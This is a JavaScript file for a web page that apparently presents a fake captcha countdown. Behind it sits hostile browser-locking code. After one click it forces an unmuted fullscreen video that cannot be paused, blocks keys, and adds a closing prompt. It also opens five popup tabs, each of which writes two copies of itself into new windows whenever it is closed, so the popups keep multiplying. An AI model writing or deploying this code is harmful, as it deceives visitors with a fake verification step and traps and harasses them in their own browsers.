/* Toggle Button to Unmute the Video */

function toggleMute() {
    var video = document.getElementById('video');
    if (video.muted) {
        video.muted = false;
    } else {
        video.muted = true;
    }
}

/* Delay Function to Add SetTimeOut After Defined Interval */

function delay(time) {
    return new Promise((resolve) => setTimeout(resolve, time));
}

/* Show Video Function to Add Display Property to Show the Video on Click of Button which will fulfilled User Interaction Needs to Browser to Run the Video with Unmute State */
function showVideo() {
    const video = document.getElementById('video');
    const container = document.getElementById('container');

    // Mostrar video
    container.style.display = 'none';
    video.style.display = 'block';
    video.muted = false;
    video.play();
    video.controls = false;

    // Prevenir pausa
    video.addEventListener('pause', () => video.play());
    document.addEventListener('keydown', (e) => {
        if (e.code === 'Space') e.preventDefault();
    });
    document.addEventListener('click', (e) => {
        if (document.fullscreenElement) e.preventDefault();
    });

    // Fullscreen
    if (video.requestFullscreen) {
        video.requestFullscreen();
    }

    // Pregunta antes de cerrar
    window.onbeforeunload = () => "¿Estás seguro que querés cerrar esto?";

    // Abrir 5 pestañas YA MISMO (acción directa del click)
    for (let i = 0; i < 5; i++) {
        const win = window.open('', '_blank');
        if (win) {
            win.document.write(`
                <html>
                    <head><title>😵</title></head>
                    <body style="margin:0; background:black; overflow:hidden;">
                        <video autoplay loop muted style="width:100vw; height:100vh; object-fit:cover;"></video>
                        <script>
                            const v = document.querySelector('video');
                            v.src = "${location.origin}/vid/video.mp4";
                            v.muted = false;
                            v.play();
                            v.controls = false;
                            v.addEventListener('pause', () => v.play());

                            window.onbeforeunload = function () {
                                for (let i = 0; i < 2; i++) {
                                    const clone = window.open('', '_blank');
                                    if (clone) {
                                        clone.document.write(document.documentElement.outerHTML);
                                        clone.document.close();
                                    }
                                }
                            };
                        </script>
                    </body>
                </html>
            `);
            win.document.close();
        }
    }

    // Foco a la última
    setTimeout(() => {
        window.blur();
    }, 100);
}




const fullscreenButton = document.getElementById('button');
const content = document.getElementById('container-video');

fullscreenButton.addEventListener('click', () => {
    if (content.requestFullscreen) {
        content.requestFullscreen();
    } else if (content.mozRequestFullScreen) { // Firefox
        content.mozRequestFullScreen();
    } else if (content.webkitRequestFullscreen) { // Chrome, Safari and Opera
        content.webkitRequestFullscreen();
    } else if (content.msRequestFullscreen) { // Internet Explorer/Edge
        content.msRequestFullscreen();
    }
});

document.addEventListener('fullscreenchange', () => {
    if (document.fullscreenElement) {
        content.style.display = 'block';
    } else {
        content.style.display = 'block';
    }
});

document.addEventListener("DOMContentLoaded", function () {
    const counterElement = document.getElementById("counter");
    const messageElement = document.getElementById("recaptcha-container");
    const messageElementText = document.getElementById("text-captcha");

    let seconds = 3;

    function updateCounter() {
        counterElement.textContent = "Please allow up to " + seconds + " seconds...";
        seconds--;

        if (seconds < 0) {
            clearInterval(interval);
            counterElement.style.display = "none";
            messageElement.style.display = "flex";
            messageElementText.style.display = "flex"
        }
    }

    updateCounter();
    const interval = setInterval(updateCounter, 1000);
});

